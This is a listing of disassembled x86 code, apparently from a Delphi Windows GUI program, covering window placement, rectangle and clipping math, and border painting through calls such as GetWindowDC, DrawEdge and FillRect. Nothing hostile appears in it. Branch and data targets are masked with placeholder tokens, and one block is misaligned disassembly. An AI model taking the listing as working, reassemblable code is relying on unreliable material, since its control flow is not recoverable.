pop ecx
mov [ fs : eax ] edx
push sub_43b68f
lea eax [ ebp - 0x4 ]
call sub_4054b4
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403324
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4054cc
sub_43b6a0
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_434208
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_43b758
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4138b8
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_41375c
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403324
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_43b7b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_43b8ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403324
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b8b5
mov eax [ ebp - 0x14 ]
call sub_403128
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_413914
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4138b8
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403324
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_43b8c4
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_43b7b8
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_43b8f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4380c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_438084
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_43b938
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43b038
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_434e24
sub_43b980
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43ba04
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_43b694
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_4380c0
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_43bdc6
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4380c0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_43b980
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_438084
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_43bddd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ba04
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_435bf8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43be1c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_436a7c
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43451c
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_43be64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436c9c
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_43be94
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_43b694
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_437c28
xor ecx ecx
push ebp
push sub_43bfc3
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4380c0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bfca
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_437c30
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_438084
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43bfca
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403324
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403324
jmp r-xdata
sub_43c060
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_435d5c
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_435d5c
sub_43c0a4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_435d5c
sub_43c114
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_43c1a4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43c40a
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41cd7c
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42c460
call sub_42c540
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_42c460
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42cc28
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_43c44c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406878
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_4346f8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_438c7c
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_435d5c
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_436f20
sub_43c4b8
push ebx
push esi
mov esi edx
call sub_44c6fc
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406814
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_435d5c
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406814
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_435d5c
